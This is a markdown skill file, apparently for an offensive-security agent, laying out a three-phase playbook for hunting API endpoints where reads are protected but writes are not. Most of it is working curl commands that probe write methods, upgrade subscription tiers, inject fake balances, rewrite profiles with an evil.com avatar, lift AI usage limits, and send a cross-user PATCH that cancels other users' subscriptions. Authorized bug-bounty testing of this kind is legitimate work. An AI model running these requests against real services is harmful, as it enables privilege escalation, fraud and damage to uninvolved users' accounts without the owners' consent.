---
name: hunt-write-gap
description: "Hunt read-protected write-gaping endpoints. PATCH/POST/DELETE without authorization while GET is protected. Agnostic: Supabase, Firebase, REST, GraphQL."
sources: field_recon, offensive_research
report_count: 8
author: uphiago
---

## When to Use

You have authenticated access to a target and can READ your own data (profile, settings, records), but need to test if you can MODIFY data beyond your authorization level. This is the #1 pattern in Supabase-backed SaaS and increasingly common in Firebase, custom REST APIs, and GraphQL backends.

**The pattern**: `GET /resource` returns only your data (RLS/auth working). `PATCH /resource` lets you change anything including tier, role, balance, and subscription status.

---

## Phase 1 — Identify Writeable Endpoints

From prior recon (schema enumeration, JS bundle analysis), build a list of endpoints that accept write methods:

```bash
TARGET="https://api.target.com"
TOKEN="<your_auth_token>"

# Test common write methods on all discovered endpoints
for ep in users subscribers profiles accounts settings; do
  for method in PATCH PUT POST; do
    code=$(curl -sk -X "$method" -w "%{http_code}" -o /tmp/resp.txt \
      "${TARGET}/${ep}" \
      -H "Authorization: Bearer ${TOKEN}" \
      -H "Content-Type: application/json" -d '{}' 2>/dev/null)
    if [ "$code" != "404" ] && [ "$code" != "405" ]; then
      echo "  $method /${ep}: HTTP $code"
    fi
  done
done
```

A 200/400 response means the endpoint EXISTS and accepts writes. 404 means it doesn't exist. 405 means wrong method.

---

## Phase 2 — Test Write Operations

For each confirmed writeable endpoint, test if you can modify privileged fields:

```bash
# Tier/role escalation
curl -sk -X PATCH "${TARGET}/subscribers?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"tier_id":"<PRO_TIER_ID>","subscribed":true}'

# Balance manipulation  
curl -sk -X POST "${TARGET}/movements" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","amount":999999,"type":"income"}'

# Profile tampering
curl -sk -X PATCH "${TARGET}/profiles?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"full_name":"HACKED","avatar_url":"https://evil.com/pwned.png"}'

# AI/rate limits bypass
curl -sk -X PATCH "${TARGET}/ai_usage_limits?user_id=eq.${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"document_analysis_limit":99999}'
```

---

## Phase 3 — Test for Cross-User Writes (IDOR Write)

After confirming your own data is writable, test if you can modify OTHER users:

```bash
# Try to write with a filter targeting other users
curl -sk -X PATCH "${TARGET}/subscribers?user_id=neq.${MY_USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -d '{"subscribed":false}'  # Try to cancel others' subscriptions

# Response: [] (empty = RLS blocked cross-user write — GOOD)
# Response: [{...}] (data returned = RLS MISSING for cross-user write — CRITICAL)
```

---

## Field-Confirmed Patterns

| Pattern | Endpoint | Impact |
|---------|----------|--------|
| Tier upgrade | `PATCH /subscribers` | Free → Pro, lifetime subscription |
| Balance injection | `POST /movements` | Fake income, corrupt analytics |
| Profile hijack | `PATCH /profiles` | Name/avatar changed, phishing vector |
| AI limits bypass | `PATCH /ai_usage_limits` | Unlimited AI processing |
| Rate limit removal | `PATCH /rate_limits` | Bypass all usage quotas |
| Config tampering | `PATCH /settings` | Modify global app configuration |

---

## Verification

- **Confirmed write gap**: PATCH/POST returns 200 with modified data in response body. Verify by GET-ing the same resource.
- **Protected**: Returns 401/403 or silently drops unauthorized fields.
- **False positive**: Endpoint accepts the request but doesn't actually persist changes (verify with GET).

---

## What Next

- If write gap confirmed → report as CRITICAL (privilege escalation + business logic bypass)
- If cross-user write works → report as CRITICAL (IDOR write = full account takeover of all users)
- If only own data writable → check `hunt-business-logic` for economic impact of self-modification
